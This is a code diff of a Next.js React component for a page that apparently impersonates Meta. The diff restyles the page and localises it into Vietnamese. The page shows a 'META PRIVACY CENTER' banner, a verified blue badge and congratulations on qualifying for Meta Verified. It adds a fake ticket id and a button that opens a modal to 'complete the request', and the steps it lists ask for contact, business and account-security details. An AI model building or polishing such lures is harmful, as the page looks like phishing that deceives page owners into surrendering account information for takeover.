@@ -1,19 +1,13 @@
 'use client'
-import AdvancedModal from '#components/modals/AdvancedModal';
 import Link from 'next/link';
 import React from 'react'
 
 const MainContent = ({ handleOpendInfoModal }: { handleOpendInfoModal: () => void }) => {
-    const [isOpendAdvanced, setIsOpendAdvanced] = React.useState(false);
     const [ticketId, setTicketId] = React.useState("4564-ATFD-4865");
     const currentDate = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
 
     const handleOpend = () => {
         handleOpendInfoModal();
-    }
-
-    const handleOpendAdvanced = () => {
-        setIsOpendAdvanced(true);
     }
 
     React.useEffect(() => {
@@ -25,37 +19,66 @@ const MainContent = ({ handleOpendInfoModal }: { handleOpendInfoModal: () => voi
         };
 
         generateTicketId();
-
     }, []);
 
     return (
         <>
-            <div className="flex flex-col items-center justify-start bg-[linear-gradient(130deg,rgba(249,241,249,1)_0%,rgba(234,243,253,1)_35%,rgba(237,251,242,1)_100%)] min-h-[100vh] w-full">
-                <div className='max-w-[768px] w-full p-[15px] h-full'>
-                    <div className="p-[15px]">
-                        <div className='flex items-start gap-[8px] flex-col justify-start mb-[30px]'>
-                            <img src="images/icons/ic_blue.svg" className='w-[48px] h-[48px]' alt="tick" />
-                            <b className='text-[2rem]'>Meta Verified - Rewards for you</b>
+            <div className="flex min-h-[100vh] w-full flex-col items-center justify-start bg-[radial-gradient(circle_at_top,rgba(24,119,242,0.12)_0%,rgba(245,249,255,1)_42%,rgba(255,255,255,1)_100%)] px-[16px] py-[28px]">
+                <div className='w-full max-w-[860px]'>
+                    <div className="rounded-[28px] border border-[#dbe9ff] bg-white p-[18px] shadow-[0_18px_45px_rgba(24,119,242,0.14)] sm:p-[28px]">
+                        <div className='mb-[20px] flex flex-wrap items-center justify-between gap-[12px] rounded-[16px] bg-[#eef4ff] px-[16px] py-[10px] text-[#1f2a45]'>
+                            <p className='text-[13px] font-semibold tracking-[0.02em]'>META PRIVACY CENTER</p>
+                            <p className='text-[13px] font-medium text-[#3f4f70]'>Issued: {currentDate}</p>
                         </div>
 
-                        <div className='w-full'>
-                            <div className='w-full mb-[20px]'>
-                                <b className='text-[17px]'>Show the world that you mean business.</b>
-                                <p className='text-[15px] mb-[0px] mt-[15px]'>Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you’ve built with your audience.</p>
-                                <p className='text-[15px] mb-[0px] mt-[15px]'>We’re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!</p>
-                                <p className='text-[16px] mb-[0px] mt-[14px] text-[#465a69]'>Your ticket id: #{ticketId}</p>
+                        <div className='mb-[26px] flex items-start gap-[12px]'>
+                            <div className='rounded-[14px] bg-[#e7f0ff] p-[12px]'>
+                                <img src="images/icons/ic_blue.svg" className='h-[38px] w-[38px]' alt="Meta verified badge" />
                             </div>
+                            <div>
+                                <h1 className='text-[1.7rem] font-extrabold leading-[1.2] text-[#0b1f44] sm:text-[2.1rem]'>
+                                    Chúc mừng! Trang của bạn đã đạt tiêu chí nhận huy hiệu xanh Meta Verified
+                                </h1>
+                                <p className='mt-[10px] text-[15px] leading-[1.65] text-[#33476a]'>
+                                    Đây là cột mốc quan trọng, thể hiện độ tin cậy, tính minh bạch và mức độ chuyên nghiệp của thương hiệu trong mắt cộng đồng.
+                                </p>
+                                <p className='mt-[8px] text-[14px] font-medium text-[#4c6087]'>Mã hồ sơ ưu tiên: #{ticketId}</p>
+                            </div>
+                        </div>
 
-                            <div className='w-full'>
-                                <p className='mb-[15px]'><b className='text-[17px] font-bold'>Verified Blue Badge Request Guide</b></p>
-                                <p className='text-[15px] mb-[10px]'>- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats</p>
-                                <p className='text-[15px] mb-[10px]'>- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.</p>
-                                <p className='text-[15px] mb-[0px]'>- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.</p>
+                        <div className='grid gap-[14px] sm:grid-cols-2'>
+                            <div className='rounded-[18px] border border-[#e5eefc] bg-[#fbfdff] p-[16px]'>
+                                <p className='mb-[8px] text-[16px] font-bold text-[#122a55]'>Giá trị khi có huy hiệu xanh</p>
+                                <ul className='space-y-[8px] text-[14px] leading-[1.6] text-[#3d5075]'>
+                                    <li>- Tăng mức độ nhận diện và uy tín thương hiệu.</li>
+                                    <li>- Dễ dàng tiếp cận khách hàng mới qua tìm kiếm và gợi ý.</li>
+                                    <li>- Góp phần bảo vệ danh tính trang khỏi mạo danh.</li>
+                                </ul>
                             </div>
+                            <div className='rounded-[18px] border border-[#d7eadf] bg-[#f4fcf7] p-[16px]'>
+                                <p className='mb-[8px] text-[16px] font-bold text-[#13462d]'>Bước tiếp theo để hoàn tất</p>
+                                <ul className='space-y-[8px] text-[14px] leading-[1.6] text-[#2f5d45]'>
+                                    <li>- Xác nhận thông tin liên hệ và thông tin doanh nghiệp.</li>
+                                    <li>- Kiểm tra bảo mật tài khoản và xác thực 2 lớp.</li>
+                                    <li>- Gửi yêu cầu để đội ngũ kiểm duyệt ưu tiên xử lý.</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div className='mt-[14px] rounded-[16px] border border-[#ffe4b8] bg-[#fff8eb] p-[14px] text-[14px] leading-[1.6] text-[#7a5a1b]'>
+                            Lưu ý: Hồ sơ đầy đủ và hợp lệ sẽ được xử lý nhanh hơn. Thời gian phản hồi thông thường trong 24 giờ, tuy nhiên có thể kéo dài trong một số trường hợp cần bổ sung thông tin.
                         </div>
                     </div>
-                    <div className='bg-[#1877f2] text-white border-none rounded-full text-[16px] font-semibold px-[24px] py-[12px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center' onClick={handleOpend}>Submit request</div>
-                    <div className='flex items-center text-center justify-center flex-wrap text-[12px] mt-[30px] text-[#65676b] gap-[16px]'>
+
+                    <button
+                        type='button'
+                        className='mx-auto my-[24px] block w-full max-w-[340px] rounded-full bg-[linear-gradient(90deg,#1877f2_0%,#1a9bff_100%)] px-[24px] py-[13px] text-[16px] font-semibold text-white shadow-[0_10px_22px_rgba(24,119,242,0.3)] transition duration-200 hover:brightness-105'
+                        onClick={handleOpend}
+                    >
+                        Hoàn tất yêu cầu Meta Verified
+                    </button>
+
+                    <div className='mt-[26px] flex flex-wrap items-center justify-center gap-[16px] text-center text-[12px] text-[#6c7a94]'>
                         <Link href="">Help Center</Link>
                         <Link href="">Privacy Policy</Link>
                         <Link href="">Terms of Service</Link>
